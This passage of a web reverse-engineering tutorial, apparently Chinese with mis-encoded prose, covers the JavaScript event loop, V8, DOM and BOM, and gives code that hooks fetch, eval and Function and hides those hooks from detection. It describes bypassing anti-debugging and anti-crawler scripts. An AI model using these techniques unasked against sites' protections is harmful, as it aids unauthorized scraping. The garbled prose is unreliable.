<span class="w">    </span><span class="nx">PI</span><span class="o">:</span><span class="w"> </span><span class="mf">3.14159</span>
<span class="p">};</span>

<span class="c1">// main.js</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">math</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./math&#39;</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">math</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">));</span><span class="w">  </span><span class="c1">// 3</span>
</code></pre>
      </div>

      <hr />

      <h2 id="é€†å‘åˆ†ææŠ€å·§">é€†å‘åˆ†ææŠ€å·§</h2>

      <h3 id="1-æŸ¥æ‰¾åŠ å¯†å‡½æ•°">1. æŸ¥æ‰¾åŠ å¯†å‡½æ•°</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// å¸¸è§çš„åŠ å¯†åº“å…³é”®è¯</span>
<span class="c1">// CryptoJS, crypto, encrypt, decrypt, MD5, SHA, AES, RSA</span>

<span class="c1">// æœç´¢æŠ€å·§</span>
<span class="c1">// åœ¨ DevTools çš„ Sources é¢æ¿ä¸­å…¨å±€æœç´¢è¿™äº›å…³é”®è¯</span>
<span class="c1">// Ctrl+Shift+F (Windows) æˆ– Cmd+Opt+F (Mac)</span>
</code></pre>
      </div>

      <h3 id="2-hook-å‡½æ•°">2. Hook å‡½æ•°</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Hook åŸç”Ÿæ–¹æ³•</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Fetch called with:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalFetch</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="p">};</span>

<span class="c1">// Hook å¯¹è±¡æ–¹æ³•</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalPush</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">push</span><span class="p">;</span>
<span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">push</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">items</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Array push:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">items</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalPush</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">items</span><span class="p">);</span>
<span class="p">};</span>
</code></pre>
      </div>

      <h3 id="3-è°ƒè¯•æ··æ·†ä»£ç ">3. è°ƒè¯•æ··æ·†ä»£ç </h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ä½¿ç”¨ debugger è¯­å¥</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">suspiciousFunction</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// æ‰§è¡Œåˆ°è¿™é‡Œä¼šè‡ªåŠ¨æ–­ç‚¹</span>
<span class="w">    </span><span class="c1">// ...</span>
<span class="p">}</span>

<span class="c1">// æ¡ä»¶æ–­ç‚¹</span>
<span class="c1">// åœ¨ DevTools ä¸­å³é”®è®¾ç½®æ¡ä»¶æ–­ç‚¹</span>
<span class="c1">// ä¾‹å¦‚ï¼šuserId === &#39;12345&#39;</span>

<span class="c1">// æ—¥å¿—ç‚¹</span>
<span class="c1">// ä¸æš‚åœæ‰§è¡Œï¼Œåªè¾“å‡ºæ—¥å¿—</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#01-Foundations-dom-and-bom">DOM ä¸ BOM</a></li>
        <li><a href="#02-Tooling-browser-devtools">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
        <li><a href="#04-Advanced-Recipes-javascript-deobfuscation">JavaScript åæ··æ·†</a></li>
        <li><a href="#03-Basic-Recipes-debugging-techniques">è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®</a></li>
      </ul>

    </div>

    <div class="section" id="01-Foundations-javascript-execution-mechanism">
      <h2>8. JavaScript Execution Mechanism</h2>
      <h1 id="javascript-æ‰§è¡Œæœºåˆ¶">JavaScript æ‰§è¡Œæœºåˆ¶</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>æ·±å…¥ç†è§£ JavaScript çš„æ‰§è¡Œæœºåˆ¶ï¼ˆäº‹ä»¶å¾ªç¯ã€V8 å¼•æ“ã€ç¼–è¯‘åŸç†ï¼‰å¯¹äºå¤„ç†å¤æ‚çš„åè°ƒè¯•è„šæœ¬ã€åˆ†æå¼‚æ­¥åŠ å¯†é€»è¾‘ä»¥åŠç†è§£æ··æ·†ä»£ç çš„æ§åˆ¶æµè‡³å…³é‡è¦ã€‚</p>

      <hr />

      <h2 id="1-å•çº¿ç¨‹ä¸äº‹ä»¶å¾ªç¯-event-loop">1. å•çº¿ç¨‹ä¸äº‹ä»¶å¾ªç¯ (Event Loop)</h2>

      <p>JavaScript æ˜¯å•çº¿ç¨‹çš„ï¼ˆä¸»çº¿ç¨‹ï¼‰ï¼Œä¸ºäº†ä¸é˜»å¡ UI æ¸²æŸ“ï¼Œå®ƒé‡‡ç”¨äº†<strong>äº‹ä»¶å¾ªç¯</strong>æœºåˆ¶æ¥å¤„ç†å¼‚æ­¥ä»»åŠ¡ã€‚</p>

      <h3 id="å®ä»»åŠ¡-macrotask-vs-å¾®ä»»åŠ¡-microtask">å®ä»»åŠ¡ (MacroTask) vs å¾®ä»»åŠ¡ (MicroTask)</h3>

      <p>è¿™æ˜¯é¢è¯•é¢˜å¸¸å®¢ï¼Œä¹Ÿæ˜¯é€†å‘åˆ†æå¼‚æ­¥ä»£ç æ‰§è¡Œé¡ºåºçš„å…³é”®ã€‚</p>

      <ul>
        <li><strong>MacroTask (å®ä»»åŠ¡)</strong>: <code>setTimeout</code>, <code>setInterval</code>,
          <code>setImmediate</code> (Node), I/O, UI Rendering.</li>
        <li><strong>MicroTask (å¾®ä»»åŠ¡)</strong>: <code>Promise.then</code>, <code>process.nextTick</code> (Node),
          <code>MutationObserver</code>.</li>
      </ul>

      <h3 id="æ‰§è¡Œé¡ºåº">æ‰§è¡Œé¡ºåº</h3>

      <ol>
        <li>æ‰§è¡ŒåŒæ­¥ä»£ç ï¼ˆMain Scriptï¼‰ã€‚</li>
        <li>æ‰§è¡Œæ‰€æœ‰ <strong>MicroTasks</strong>ï¼ˆæ¸…ç©ºå¾®ä»»åŠ¡é˜Ÿåˆ—ï¼‰ã€‚</li>
        <li>æ‰§è¡Œ <strong>ä¸€ä¸ª</strong> MacroTaskã€‚</li>
        <li>æ‰§è¡Œæ‰€æœ‰ <strong>MicroTasks</strong>ã€‚</li>
        <li>æ›´æ–° UI æ¸²æŸ“ã€‚</li>
        <li>å›åˆ°æ­¥éª¤ 3ã€‚</li>
      </ol>

      <h3 id="reverse-engineering-context-åè°ƒè¯•é™·é˜±">[Reverse Engineering Context] åè°ƒè¯•é™·é˜±</h3>

      <p>å¾ˆå¤šåè°ƒè¯•ä»£ç åˆ©ç”¨ MicroTask çš„é«˜ä¼˜å…ˆçº§æ¥å¡æ­»æµè§ˆå™¨æˆ–è€…æ£€æµ‹è°ƒè¯•å™¨ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ç¤ºä¾‹ï¼šåˆ©ç”¨ Event Loop å·®å¼‚æ£€æµ‹ç¯å¢ƒæˆ–åˆ¶é€ æ—¶åºæ··æ·†</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Start&quot;</span><span class="p">);</span>

<span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Timeout&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// å®ä»»åŠ¡</span>
<span class="p">},</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>

<span class="nb">Promise</span><span class="p">.</span><span class="nx">resolve</span><span class="p">().</span><span class="nx">then</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Promise&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// å¾®ä»»åŠ¡</span>
<span class="w">  </span><span class="c1">// æ¶æ„ä»£ç å¯èƒ½æ’åœ¨è¿™é‡Œï¼Œä¼˜å…ˆäº setTimeout æ‰§è¡Œ</span>
<span class="p">});</span>

<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;End&quot;</span><span class="p">);</span>

<span class="c1">// è¾“å‡º: Start -&gt; End -&gt; Promise -&gt; Timeout</span>
</code></pre>
      </div>

      <p>å¦‚æœåœ¨ <code>setTimeout</code> å›è°ƒé‡Œä¸‹äº†æ–­ç‚¹ï¼Œå´å‘ç°åœ¨æ­¤ä¹‹å‰æŸäº›å˜é‡å·²ç»è¢« <code>Promise</code> æ”¹äº†ï¼Œè¿™å°±æ˜¯åŸå› ã€‚</p>

      <hr />

      <h2 id="2-v8-å¼•æ“æ¶æ„">2. V8 å¼•æ“æ¶æ„</h2>

      <p>Chrome å’Œ Node.js éƒ½ä½¿ç”¨ V8 å¼•æ“ã€‚</p>

      <h3 id="ç¼–è¯‘æµæ°´çº¿">ç¼–è¯‘æµæ°´çº¿</h3>

      <ol>
        <li><strong>Parse</strong>: æºç  -> AST (æŠ½è±¡è¯­æ³•æ ‘)ã€‚</li>
        <li><strong>Ignition (è§£é‡Šå™¨)</strong>: AST -> Bytecode (å­—èŠ‚ç ) å¹¶æ‰§è¡Œã€‚</li>
        <li><strong>TurboFan (ä¼˜åŒ–ç¼–è¯‘å™¨)</strong>: å°†çƒ­ç‚¹ Bytecode ç¼–è¯‘æˆé«˜æ•ˆçš„ Machine Code (æœºå™¨ç )ã€‚</li>
        <li><strong>Deoptimization (å»ä¼˜åŒ–)</strong>: å¦‚æœå‡è®¾å¤±è´¥ï¼ˆä¾‹å¦‚å˜é‡ç±»å‹å˜äº†ï¼‰ï¼Œä»æœºå™¨ç é€€å›åˆ°å­—èŠ‚ç ã€‚</li>
      </ol>

      <h3 id="reverse-engineering-context-jit-å¸¦æ¥çš„ç°è±¡">[Reverse Engineering Context] JIT å¸¦æ¥çš„ç°è±¡</h3>

      <ul>
        <li><strong>çƒ­ç‚¹å‡½æ•°</strong>: å¦‚æœä¸€ä¸ªåŠ å¯†å‡½æ•°è¢«é¢‘ç¹è°ƒç”¨ï¼Œå®ƒä¼šè¢«ç¼–è¯‘æˆæå…¶é«˜æ•ˆçš„æ±‡ç¼–ã€‚åœ¨ Profiler ä¸­çœ‹åˆ°æ ‡çº¢çš„å¯èƒ½æ˜¯å…³é”®é€»è¾‘ã€‚</li>
        <li><strong>ç±»å‹å˜æ¢</strong>: æ··æ·†ä»£ç æœ‰æ—¶ä¼šæ•…æ„é¢‘ç¹æ”¹å˜å˜é‡ç±»å‹ï¼ˆInt -> String -> Objectï¼‰ï¼Œå¼ºè¿« V8 è¿›è¡Œ
          Deoptimizationï¼Œå¯¼è‡´ä»£ç æ‰§è¡Œå˜æ…¢ï¼Œå¹²æ‰°æ€§èƒ½åˆ†æï¼Œç”šè‡³åˆ©ç”¨ JIT Bugã€‚</li>
      </ul>

      <hr />

      <h2 id="3-ä½œç”¨åŸŸé“¾ä¸ä¸Šä¸‹æ–‡">3. ä½œç”¨åŸŸé“¾ä¸ä¸Šä¸‹æ–‡</h2>

      <h3 id="æ‰§è¡Œä¸Šä¸‹æ–‡-execution-context">æ‰§è¡Œä¸Šä¸‹æ–‡ (Execution Context)</h3>

      <p>æ¯å½“ JS å¼•æ“æ‰§è¡Œä»£ç æ—¶ï¼Œéƒ½ä¼šåˆ›å»ºä¸Šä¸‹æ–‡ï¼š</p>

      <ul>
        <li><strong>Global Context</strong>: å…¨å±€ã€‚</li>
        <li><strong>Function Context</strong>: å‡½æ•°è°ƒç”¨æ—¶åˆ›å»ºã€‚</li>
      </ul>

      <h3 id="å˜é‡å¯¹è±¡-vo-ä¸-æ´»åŠ¨å¯¹è±¡-ao">å˜é‡å¯¹è±¡ (VO) ä¸ æ´»åŠ¨å¯¹è±¡ (AO)</h3>

      <ul>
        <li>å­˜å‚¨å‡½æ•°å†…çš„ arguments, å˜é‡, å†…éƒ¨å‡½æ•°ã€‚</li>
        <li>é€†å‘æ—¶ï¼ŒScopes é¢æ¿çœ‹åˆ°çš„ Closure å°±æ˜¯ä¿å­˜äº†å¤–éƒ¨å‡½æ•° AO çš„å¼•ç”¨ã€‚</li>
      </ul>

      <hr />

      <h2 id="4-åƒåœ¾å›æ”¶-garbage-collection">4. åƒåœ¾å›æ”¶ (Garbage Collection)</h2>

      <p>V8 ä½¿ç”¨åˆ†ä»£å›æ”¶ç®—æ³•ï¼š</p>

      <ul>
        <li><strong>æ–°ç”Ÿä»£ (New Space)</strong>: å­˜æ´»æ—¶é—´çŸ­çš„å¯¹è±¡ï¼Œä½¿ç”¨ Scavenge ç®—æ³• (å¤åˆ¶æ¸…é™¤)ã€‚</li>
        <li><strong>è€ç”Ÿä»£ (Old Space)</strong>: å­˜æ´»æ—¶é—´é•¿çš„å¯¹è±¡ï¼Œä½¿ç”¨ Mark-Sweep (æ ‡è®°æ¸…é™¤) å’Œ Mark-Compact (æ ‡è®°æ•´ç†)ã€‚</li>
      </ul>

      <h3 id="reverse-engineering-context-å†…å­˜æ³„æ¼">[Reverse Engineering Context] å†…å­˜æ³„æ¼</h3>

      <p>å¦‚æœå‘ç°ç½‘é¡µå†…å­˜æŒç»­é£™å‡ï¼Œå¯èƒ½æ˜¯åçˆ¬è™«è„šæœ¬åœ¨æ•…æ„åˆ¶é€ å†…å­˜å‹åŠ›ï¼Œæˆ–è€…ç”±äºé¢‘ç¹åˆ›å»ºæœªé”€æ¯çš„é—­åŒ…å¯¼è‡´ã€‚</p>

      <hr />

      <h2 id="5-eval-ä¸-function-æ„é€ å™¨">5. Eval ä¸ Function æ„é€ å™¨</h2>

      <p>åŠ¨æ€æ‰§è¡Œä»£ç çš„ä¸¤ç§æ–¹å¼ï¼Œä¹Ÿæ˜¯æ··æ·†çš„é‡ç¾åŒºã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nb">eval</span><span class="p">(</span><span class="s2">&quot;var a = 1;&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// è®¿é—®æœ¬åœ°ä½œç”¨åŸŸ</span>
<span class="ow">new</span><span class="w"> </span><span class="nb">Function</span><span class="p">(</span><span class="s2">&quot;return 1&quot;</span><span class="p">)();</span><span class="w"> </span><span class="c1">// åªèƒ½è®¿é—®å…¨å±€ä½œç”¨åŸŸ</span>
</code></pre>
      </div>

      <p><strong>å¯¹æŠ—</strong>: Hook <code>eval</code> å’Œ <code>Function</code> æ˜¯è·å–è§£å¯†åä»£ç çš„æœ€å¿«è·¯å¾„ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Hook eval</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">_eval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nb">eval</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nb">eval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[eval]&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">str</span><span class="p">);</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">_eval</span><span class="p">(</span><span class="nx">str</span><span class="p">);</span>
<span class="p">};</span>

<span class="c1">// Hook Function</span>
<span class="c1">// æ³¨æ„ï¼šFunction ä¸ä»…ä»…æ˜¯å‡½æ•°ï¼Œå®ƒæœ¬èº«ä¹Ÿæ˜¯æ„é€ å™¨</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">_Function</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nb">Function</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nb">Function</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">body</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="nx">args</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">];</span>
<span class="w">  </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[Function]&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">body</span><span class="p">);</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">_Function</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="p">};</span>
<span class="c1">// ä¿æŒåŸå‹é“¾ï¼Œé˜²æ­¢æ£€æµ‹</span>
<span class="nb">window</span><span class="p">.</span><span class="nb">Function</span><span class="p">.</span><span class="nx">prototype</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_Function</span><span class="p">.</span><span class="nx">prototype</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nb">Function</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="kr">constructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nb">Function</span><span class="p">;</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>ç†è§£ JS æ‰§è¡Œæœºåˆ¶è®©æˆ‘ä»¬ä¸ä»…èƒ½çœ‹æ‡‚ä»£ç ï¼Œè¿˜èƒ½çœ‹æ‡‚ä»£ç â€œèƒŒåâ€çš„è¡Œä¸ºâ€”â€”ä¸ºä»€ä¹ˆè¿™é‡Œçš„æ–­ç‚¹è¿›ä¸å»ï¼Ÿä¸ºä»€ä¹ˆè¿™æ®µä»£ç æ‰§è¡Œé¡ºåºå’Œæƒ³çš„ä¸ä¸€æ ·ï¼Ÿä¸ºä»€ä¹ˆå†…å­˜ä¸€ç›´åœ¨æ¶¨ï¼Ÿè¿™äº›é—®é¢˜çš„ç­”æ¡ˆéƒ½åœ¨ Event Loop å’Œ V8 å¼•æ“é‡Œã€‚</p>

    </div>

    <div class="section" id="01-Foundations-dom-and-bom">
      <h2>9. DOM And BOM</h2>
      <h1 id="dom-ä¸-bom">DOM ä¸ BOM</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>DOM (æ–‡æ¡£å¯¹è±¡æ¨¡å‹) å’Œ BOM (æµè§ˆå™¨å¯¹è±¡æ¨¡å‹) æ˜¯ JavaScript ä¸ç½‘é¡µå†…å®¹åŠæµè§ˆå™¨çª—å£äº¤äº’çš„æ¥å£ã€‚åœ¨ Web é€†å‘ä¸­ï¼Œç†è§£å®ƒä»¬å¯¹äºå®šä½é¡µé¢å…ƒç´ ã€åˆ†æäº‹ä»¶è§¦å‘é€»è¾‘ä»¥åŠåº”å¯¹åè°ƒè¯•è‡³å…³é‡è¦ã€‚</p>

      <hr />

      <h2 id="dom-document-object-model">DOM (Document Object Model)</h2>

      <p>DOM å°† HTML æ–‡æ¡£è§£æä¸ºä¸€ä¸ªæ ‘çŠ¶ç»“æ„ï¼ŒJavaScript é€šè¿‡ DOM API æ¥æ“ä½œé¡µé¢å†…å®¹ã€‚</p>

      <h3 id="1-æ ¸å¿ƒæ¦‚å¿µ">1. æ ¸å¿ƒæ¦‚å¿µ</h3>

      <ul>
        <li><strong>DOM Tree</strong>: æ•´ä¸ªæ–‡æ¡£çš„å±‚çº§ç»“æ„ã€‚</li>
        <li><strong>Node (èŠ‚ç‚¹)</strong>: æ ‘ä¸­çš„æ¯ä¸ªç»„æˆéƒ¨åˆ†ï¼ˆå…ƒç´ ã€æ–‡æœ¬ã€æ³¨é‡Šç­‰ï¼‰ã€‚</li>
        <li><strong>Element (å…ƒç´ )</strong>: HTML æ ‡ç­¾å¯¹åº”çš„èŠ‚ç‚¹ï¼ˆå¦‚ <code>&lt;div&gt;</code>, <code>&lt;body&gt;</code>ï¼‰ã€‚</li>
      </ul>

      <h3 id="2-å¸¸ç”¨æ“ä½œ">2. å¸¸ç”¨æ“ä½œ</h3>

      <h4 id="é€‰æ‹©ä¸éå†">é€‰æ‹©ä¸éå†</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// é€‰æ‹©å™¨</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;app&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// å”¯ä¸€ ID</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">&quot;.class-name&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// ç¬¬ä¸€ä¸ªåŒ¹é…</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">querySelectorAll</span><span class="p">(</span><span class="s2">&quot;div &gt; span&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// æ‰€æœ‰åŒ¹é…</span>

<span class="c1">// éå†</span>
<span class="nx">element</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">;</span><span class="w"> </span><span class="c1">// çˆ¶èŠ‚ç‚¹</span>
<span class="nx">element</span><span class="p">.</span><span class="nx">children</span><span class="p">;</span><span class="w"> </span><span class="c1">// å­å…ƒç´ åˆ—è¡¨</span>
<span class="nx">element</span><span class="p">.</span><span class="nx">nextElementSibling</span><span class="p">;</span><span class="w"> </span><span class="c1">// ä¸‹ä¸€ä¸ªå…„å¼Ÿå…ƒç´ </span>
</code></pre>
      </div>

      <h4 id="ä¿®æ”¹-dom">ä¿®æ”¹ DOM</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åˆ›å»º</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">newDiv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;div&quot;</span><span class="p">);</span>
<span class="nx">newDiv</span><span class="p">.</span><span class="nx">innerText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Injected Content&quot;</span><span class="p">;</span>

<span class="c1">// æ’å…¥</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">newDiv</span><span class="p">);</span>

<span class="c1">// åˆ é™¤</span>
<span class="nx">element</span><span class="p">.</span><span class="nx">remove</span><span class="p">();</span>

<span class="c1">// å±æ€§æ“ä½œ</span>
<span class="nx">input</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;hacked&quot;</span><span class="p">;</span>
<span class="nx">img</span><span class="p">.</span><span class="nx">getAttribute</span><span class="p">(</span><span class="s2">&quot;src&quot;</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="3-äº‹ä»¶ç³»ç»Ÿ-event-system">3. äº‹ä»¶ç³»ç»Ÿ (Event System)</h3>

      <p>é€†å‘ä¸­æœ€é‡è¦çš„éƒ¨åˆ†ä¹‹ä¸€ã€‚æŒ‰é’®ç‚¹å‡»è§¦å‘åŠ å¯†ã€è¡¨å•æäº¤è§¦å‘éªŒè¯ï¼ŒèƒŒåéƒ½æ˜¯äº‹ä»¶åœ¨é©±åŠ¨ã€‚</p>

      <h4 id="äº‹ä»¶æµ">äº‹ä»¶æµ</h4>

      <ol>
        <li><strong>æ•è·é˜¶æ®µ (Capturing)</strong>: ä» window å¾€ä¸‹ä¼ å¯¼åˆ°ç›®æ ‡å…ƒç´ ã€‚</li>
        <li><strong>ç›®æ ‡é˜¶æ®µ (Target)</strong>: åˆ°è¾¾å®é™…è§¦å‘äº‹ä»¶çš„å…ƒç´ ã€‚</li>
        <li><strong>å†’æ³¡é˜¶æ®µ (Bubbling)</strong>: ä»ç›®æ ‡å…ƒç´ å¾€ä¸Šä¼ å¯¼å› windowã€‚</li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">element</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">handler</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">);</span><span class="w"> </span><span class="c1">// false è¡¨ç¤ºåœ¨å†’æ³¡é˜¶æ®µè§¦å‘ï¼ˆé»˜è®¤ï¼‰</span>
</code></pre>
      </div>

      <h4 id="reverse-engineering-context-å®šä½äº‹ä»¶ç›‘å¬å™¨">[Reverse Engineering Context] å®šä½äº‹ä»¶ç›‘å¬å™¨</h4>

      <p><strong>é—®é¢˜</strong>: ç‚¹å‡»ä¸€ä¸ªæŒ‰é’®è§¦å‘äº†åŠ å¯†è¯·æ±‚ï¼Œä»£ç åœ¨å“ªé‡Œï¼Ÿ</p>

      <p><strong>æ–¹æ³•</strong>:</p>

      <ol>
        <li><strong>DevTools -> Elements é¢æ¿</strong>: é€‰ä¸­å…ƒç´ ï¼Œå³ä¾§ &#8220;Event Listeners&#8221; æ ‡ç­¾ã€‚å¯ä»¥çœ‹åˆ°ç»‘å®šçš„äº‹ä»¶ï¼Œç‚¹å‡»é“¾æ¥è·³è½¬åˆ° JS ä»£ç ã€‚
          <ul>
            <li>_æ³¨æ„_: å¦‚æœä½¿ç”¨äº† jQuery æˆ– Vue/React æ¡†æ¶ï¼Œç›‘å¬å™¨å¯èƒ½ç»‘å®šåœ¨ <code>document</code> æˆ–çˆ¶èŠ‚ç‚¹ä¸Šï¼ˆäº‹ä»¶å§”æ‰˜ï¼‰ã€‚</li>
          </ul>
        </li>
        <li><strong>DevTools -> Sources -> Event Listener Breakpoints</strong>: å‹¾é€‰
          <code>Mouse -&gt; click</code>ã€‚ç‚¹å‡»æŒ‰é’®æ—¶æ–­ç‚¹ä¼šåœåœ¨äº‹ä»¶å¤„ç†å‡½æ•°çš„ç¬¬ä¸€è¡Œã€‚</li>
        <li><strong>DOM æ–­ç‚¹</strong>:
          <ul>
            <li><strong>Subtree modifications</strong>: ç›‘å¬å­èŠ‚ç‚¹å˜åŒ–ï¼ˆå¦‚åŠ¨æ€æ’å…¥äº†åŠ å¯†åçš„ tokenï¼‰ã€‚</li>
            <li><strong>Attribute modifications</strong>: ç›‘å¬å±æ€§å˜åŒ–ï¼ˆå¦‚ class æ”¹å˜ï¼‰ã€‚</li>
            <li><strong>Node removal</strong>: ç›‘å¬èŠ‚ç‚¹è¢«åˆ é™¤ã€‚</li>
          </ul>
        </li>
      </ol>

      <hr />

      <h2 id="bom-browser-object-model">BOM (Browser Object Model)</h2>

      <p>BOM æä¾›äº†ä¸æµè§ˆå™¨çª—å£äº¤äº’çš„å¯¹è±¡ï¼Œæ ¸å¿ƒæ˜¯ <code>window</code>ã€‚</p>

      <h3 id="1-window-å¯¹è±¡">1. Window å¯¹è±¡</h3>

      <p>å…¨å±€ä½œç”¨åŸŸå¯¹è±¡ï¼Œæ‰€æœ‰å…¨å±€å˜é‡ï¼ˆ<code>var</code>ï¼‰å’Œå‡½æ•°éƒ½æ˜¯å®ƒçš„å±æ€§ã€‚</p>

      <ul>
        <li><strong>é€†å‘æŠ€å·§</strong>: åœ¨ Console è¾“å…¥ <code>window</code> æˆ– <code>this</code> æŸ¥çœ‹æŒ‚è½½çš„å…¨å±€å¯¹è±¡ï¼Œå¸¸èƒ½å‘ç°æš´éœ²å‡ºæ¥çš„åŠ å¯†åº“ï¼ˆå¦‚
          <code>window.encrypt_lib</code>ï¼‰ã€‚</li>
      </ul>

